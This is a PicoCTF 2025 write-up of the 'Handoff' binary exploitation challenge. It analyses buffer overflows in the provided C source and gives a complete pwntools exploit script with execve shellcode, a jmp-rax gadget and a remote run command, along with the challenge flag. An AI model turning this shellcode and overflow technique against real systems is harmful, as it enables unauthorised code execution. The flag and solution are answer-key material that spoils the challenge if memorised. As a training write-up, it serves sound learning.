# ü§ù Challenge: Handoff ‚Äî Stack Pivot and ROP Shellcode Execution

**Category:** Binary Exploitation  
**CTF:** PicoCTF 2025  
**Flag:** `picoCTF{p1v0ted_ftw_b0b2237e}`

---

## üìù Description

> A seemingly harmless menu-driven application allows you to hand off messages to different recipients. But what's hiding underneath its surface is a golden opportunity for exploitation.

You're given:
- üìÅ [Binary: `handoff`](https://challenge-files.picoctf.net/c_shape_facility/48976a71eb9efc7a8f22074e28db55618066e35d78c58fbf5e1adfe82e5ee367/handoff)
- üìÑ [Source code: `handoff.c`](https://challenge-files.picoctf.net/c_shape_facility/48976a71eb9efc7a8f22074e28db55618066e35d78c58fbf5e1adfe82e5ee367/handoff.c)

---

## üîç Vulnerability Analysis

### üëÄ Highlights from `handoff.c`

```
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define MAX_ENTRIES 10
#define NAME_LEN 32
#define MSG_LEN 64

typedef struct entry {
	char name[8];
	char msg[64];
} entry_t;

void print_menu() {
	puts("What option would you like to do?");
	puts("1. Add a new recipient");
	puts("2. Send a message to a recipient");
	puts("3. Exit the app");
}

int vuln() {
	char feedback[8];
	entry_t entries[10];
	int total_entries = 0;
	int choice = -1;
	// Have a menu that allows the user to write whatever they want to a set buffer elsewhere in memory
	while (true) {
		print_menu();
		if (scanf("%d", &choice) != 1) exit(0);
		getchar(); // Remove trailing \n

		// Add entry
		if (choice == 1) {
			choice = -1;
			// Check for max entries
			if (total_entries >= MAX_ENTRIES) {
				puts("Max recipients reached!");
				continue;
			}

			// Add a new entry
			puts("What's the new recipient's name: ");
			fflush(stdin);
			fgets(entries[total_entries].name, NAME_LEN, stdin);
			total_entries++;
			
		}
		// Add message
		else if (choice == 2) {
			choice = -1;
			puts("Which recipient would you like to send a message to?");
			if (scanf("%d", &choice) != 1) exit(0);
			getchar();

			if (choice >= total_entries) {
				puts("Invalid entry number");
				continue;
			}

			puts("What message would you like to send them?");
			fgets(entries[choice].msg, MSG_LEN, stdin);
		}
		else if (choice == 3) {
			choice = -1;
			puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");
			fgets(feedback, NAME_LEN, stdin);
			feedback[7] = '\0';
			break;
		}
		else {
			choice = -1;
			puts("Invalid option");
		}
	}
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);  // No buffering (immediate output)
	vuln();
	return 0;
}
```

## üî• Vulnerabilities Identified:

   1. Buffer Overflow on Exit (feedback)

        Uses fgets(feedback, 32) but feedback is only 8 bytes!

        Allows overwriting total_entries, saved RBP, and return address.

   2. Buffer Overflow on Name

        Uses fgets(entries[].name, 32) but name[8] only allows 8 bytes!

   3. Buffer Underflow on Message

        Negative index values for entries[] allowed when selecting recipient by number:

    if (choice >= total_entries) // no lower-bound check!


NX/PIE/Canary Protections

    NX bit disabled: We can inject and execute shellcode.

    PIE disabled: Code addresses are fixed ‚Äî ideal for ROP gadgets.

    No stack canaries: Classic stack overflow viable.

## üß® Exploitation Strategy
## üß± Plan of Attack

Starting the explanation with step 3, above - the overflow of `feedback`. The construction of this overflow has two core goals;

- replace the `vuln()` return address with our `jmp $rax` ROP gadget address, which is just a known absolute address we put in our payload (No PIE).
- construct another jump from within this area to our shellcode. This was done knowing the value of `$rax` was currently pointing to `feedback` (at `$rbp-0x0c`) and we want to jump to `entries[0].msg[]` (at `$rbp-0x2d8`). So a simple subtraction from `$rax` we can then execute another `jmp $rax` to reach our shellcode.

These two instructions (sub $rax, and jmp $rax) were 8 bytes. But `feedback[7]` gets overwritten with that null termination character, overwriting the last byte of our second opcode!

So what I ended up doing was having another relative jump at the start of `feedback`, that jumped to these two instructions that I ended up within `total_entries` location.

So the final `feedback` payload structure looks like:

```
<JMP 0x6><NOP x6 (padding)><SUB $RAX, 0x2CC><JMP $RAX><'AAAA' padding><JMP_RAX_ROP_GADGET_ADDRESS>
```

Refer to the stack layout diagram above for how this overlays the stack locals and return address and the padding required to align this.

The shellcode constructed for step 2, above - for the `entry[0]` message payload is fairly run of the mill.

```
shellcode = asm("""
  mov rdi, rax
  add rdi, (64 - 9)
  mov rax, 59
  xor rsi, rsi
  xor rdx, rdx
  syscall
  mov rax, 0x40143f
  jmp rax
  """, arch = 'amd64')
```

So the final `entry[0]` message payload structure looks like:

```
<shellcode><NOP padding><"/bin/sh\0" string>
```

We just use the fact the buffer is a total of 64 bytes, place our `"/bin/sh\0 "` string at the bottom of this and knowing `$rax` points to the start of our shellcode at `entries[0].msg` we can calculate `$rdi` accordingly (pointer to command string to execute).

To clean up after executing the shell, I added a jump to `<main+48>` (at `0x40143f`) to exit the challenge binary in a slightly more orderly fashion.

All of this in practice results in the following jump structure, the flow identified through steps (a) through to (d):

```
                          (.text code segment)
                                 .
                  |              .                |
                  |-------------------------------|
        +-------->|            JMP $RAX           | 0x40116c
        |    +----|--*     ( our ROP gadget )     |
        |    |    |-------------------------------|
        |    |    |              .                |
        |   (b)                  .
        |    |
        |    |
        |    |
        |    |            (top of the stack)
        |    |    |                               |
        |    |    |-------------------------------|
        |    |    |            choice             |
        |    |    |-------------------------------|
        |    |    |       entries[0].name[]       |
        |    |    |   ------------------------    |
        |    |    |       entries[0].msg[]        |<-------+
        |    |    |                               |        |
        |    |    |       { our shellcode }       |        |
        |    |    |                               |        |
        |    |    |-------------------------------|        |
        |    |    |              .                |        |
        |    |    |              .                |        |
        |    |    |       entries[1..9]           |        |
        |    |    |              .                |        |
        |    |    |              .                |        |
        |    |    |-------------------------------|        |
        |    +--->|         feedback[]            |        |
        |  +--(c)-|-JMP re|   |   |   |   |   | 0 |        |
        |  |      |-------------------------------|        |
        |  +----->|        total_entries          |        |
        |         | SUB EAX, 0x2CC    | JMP $RAX--|--(d)---+
        |         |-------------------------------|     
        |         |   Saved $rbp (main() frame)   |     
        |         =================================     
        +---(a)---|--*     Return address         |     
                  |-------------------------------|    
                  |                               |
```

Note that the `Saved $rbp` entry at `$rbp` does get clobbered by the code added at `total_entries` as this required 8 bytes for the two instructions (SUB and JMP) and `total_entries` is only 4 bytes. But we don't need to worry about preserving `main()`'s stack frame so much anyway.


## üß™ Exploit Script (Python + pwntools)

```
#!/usr/bin/env python3

from pwn import *

target_elf = ELF("./handoff")

# command line support for local, remote and gdb modes
if len(sys.argv) > 1:
  if "remote" in sys.argv:
    if len(sys.argv) > 3:
      target_proc = remote(sys.argv[2], sys.argv[3])
    else:
      print('usage: ./pwn-game.py remote <server> <port>')
      exit(1)
  elif "gdb" in sys.argv:
    target_proc = target_elf.process()
    gdb.attach(target_proc)
else:
  target_proc = target_elf.process()


# add an entry (name = NOP sled)
target_proc.recvuntil(b'3. Exit the app\n')
target_proc.sendline(b'1');
target_proc.recvuntil(b'What\'s the new recipient\'s name:')
target_proc.sendline(b'\x90' * 30)

# write a message with our shellcode, for entries[0]
target_proc.recvuntil(b'3. Exit the app\n')
target_proc.sendline(b'2');
target_proc.recvuntil(b'Which recipient would you like to send a message to?')
target_proc.sendline(b'0')
target_proc.recvuntil(b'What message would you like to send them?')
random_shellcode = asm("""
  mov rdi, rax
  add rdi, (64 - 9)
  mov rax, 59
  xor rsi, rsi
  xor rdx, rdx
  syscall
  mov rax, 0x40143f
  jmp rax
  """, arch = 'amd64')
print('shellcode = ' + str(len(random_shellcode)) + ' bytes')
random_shellcode += b'\x90'*(64-9-len(random_shellcode))
random_shellcode += b'/bin/sh\x00'
target_proc.sendline(random_shellcode)

# overflow feedback
target_proc.recvuntil(b'3. Exit the app\n')
target_proc.sendline(b'3')
payload = b'\xeb\x06' + b'\x90'*6   # jmp to <total_entries>
payload += asm("""
  sub rax, (0x2D4 - 8)              
  jmp rax                           
 """, arch = 'amd64')
# $rax=<feedback> sub to get to <entries[0].message>
# jump to our shellcode
payload += b'A'*4 + p64(0x40116c) # pad remainder of saved rbp, set ret to "jmp rax" gadget
print(len(payload))
target_proc.sendline(payload)

target_proc.interactive()
```
In command line write the code
```
python3 exploit.py remote shape-facility.picoctf.net 52947 
```

## üèÅ Final Flag

`picoCTF{p1v0ted_ftw_b0b2237e}`

## üõ†Ô∏è Tools & Techniques

    pwntools (remote, asm, interactive)

    x86_64 shellcode with execve

    ROP gadget chaining (jmp rax)

    Stack pivoting via offset calculation

## üìö References

    pwntools documentation

    ROP Emporium

    LiveOverflow - Stack Buffer Overflow series

    Shell-storm x86_64 shellcodes

## ‚ö†Ô∏è Disclaimer

This writeup is for educational purposes only. Always obtain legal permission before testing or exploiting software. Unauthorized access is illegal and unethical.



